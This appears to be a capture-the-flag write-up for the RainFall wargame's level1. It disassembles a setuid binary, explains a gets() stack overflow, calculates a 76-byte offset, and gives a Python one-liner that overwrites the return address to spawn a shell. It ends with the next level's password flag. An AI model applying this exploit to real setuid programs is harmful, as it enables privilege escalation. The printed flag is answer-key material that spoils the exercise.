# Level1

## 1. Initial Analysis
I started by identifying the file type and permissions of the binary located in the home directory.
```bash
level1@RainFall:~$ file level1
level1: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x099e580e4b9d2f1ea30ee82a22229942b231f2e0, not stripped
```
```bash
level1@RainFall:~$ ls -l 
total 8
-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
```
## 2. Reverse Engineering with GDB
```bash
level1@RainFall:~$ gdb ./level1
```

im beginning by analyse functions in binary
```nasm
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  gets
0x08048340  gets@plt
0x08048350  fwrite
0x08048350  fwrite@plt
0x08048360  system
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  run
0x08048480  main
0x080484a0  __libc_csu_init
0x08048510  __libc_csu_fini
0x08048512  __i686.get_pc_thunk.bx
0x08048520  __do_global_ctors_aux
```
we have two interisting functions 

gets@plt: A known vulnerable function that does not check buffer boundaries.It can be exploited to cause a buffer overflow.
run: A non-standard function located at address 0x08048444.

i have analyse the main and run functions 

main:
```nasm
08048480 <main>:
 8048480:	55                   	push   %ebp
 8048481:	89 e5                	mov    %esp,%ebp
 8048483:	83 e4 f0             	and    $0xfffffff0,%esp
 8048486:	83 ec 50             	sub    $0x50,%esp
 8048489:	8d 44 24 10          	lea    0x10(%esp),%eax
 804848d:	89 04 24             	mov    %eax,(%esp)
 8048490:	e8 ab fe ff ff       	call   8048340 <gets@plt>
 8048495:	c9                   	leave  
 8048496:	c3                   	ret    
 8048497:	90                   	nop
 8048498:	90                   	nop
 8048499:	90                   	nop
 804849a:	90                   	nop
 804849b:	90                   	nop
 804849c:	90                   	nop
 804849d:	90                   	nop
 804849e:	90                   	nop
 804849f:	90                   	nop
```

run:
```nasm
08048444 <run>:
 8048444:	55                   	push   %ebp
 8048445:	89 e5                	mov    %esp,%ebp
 8048447:	83 ec 18             	sub    $0x18,%esp
 804844a:	a1 c0 97 04 08       	mov    0x80497c0,%eax
 804844f:	89 c2                	mov    %eax,%edx
 8048451:	b8 70 85 04 08       	mov    $0x8048570,%eax
 8048456:	89 54 24 0c          	mov    %edx,0xc(%esp)
 804845a:	c7 44 24 08 13 00 00 	movl   $0x13,0x8(%esp)
 8048461:	00 
 8048462:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
 8048469:	00 
 804846a:	89 04 24             	mov    %eax,(%esp)
 804846d:	e8 de fe ff ff       	call   8048350 <fwrite@plt>
 8048472:	c7 04 24 84 85 04 08 	movl   $0x8048584,(%esp)
 8048479:	e8 e2 fe ff ff       	call   8048360 <system@plt>
 804847e:	c9                   	leave  
 804847f:	c3                   	ret
 ```


## 3. Exploit the vulnerability overflow
 The main function allocates $0x50$ (80) bytes on the stack, but the buffer passed to gets starts at esp + 16. This leaves $80 - 16 = 64$ bytes before reaching the saved EBP.This 16-byte gap is specifically reserved by the compiler as an Argument Area to comply with the System V ABI, which requires the stack to be 16-byte aligned for CPU efficiency and provides a "landing zone" to store the arguments for the next function call. The lea (Load Effective Address) instruction is mandatory in this process because gets needs a memory address (a pointer) to know where to write data, rather than a value; lea 0x10(%esp), %eax calculates the coordinate of the buffer 16 bytes above the stack pointer and moves it to the top of the stack so gets can access it.
 
 Offset Calculation:
 - Buffer: 64 bytes
 - Padding/Saved EBP: 12 bytes
 - Total Offset to EIP: 76 bytes

 By providing 76 bytes of "junk" data, the next 4 bytes will overwrite the EIP (Instruction Pointer), allowing us to redirect execution to the run function.4. ExploitationThe target address for run is 0x08048444. Because the Intel 80386 architecture is Little Endian, the address bytes must be provided in reverse order: \x44\x84\x04\x08.

 We utilize a Python print command to generate the payload. However, since the run function executes system("/bin/sh"), a standard pipe would close immediately after the payload is sent. To keep the shell open and interactive, we wrap the payload and a cat command in a subshell:
 ```bash
 level1@RainFall:~$ (python -c "print 'c' * 76 + '\x44\x84\x04\x08'"; cat) | ./level1
 ```
Like the previous level, there is a .pass file in the level1 folder that contains the flag
```bash
$ cd /home/user/level2
$ cat .pass
```

## flag
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77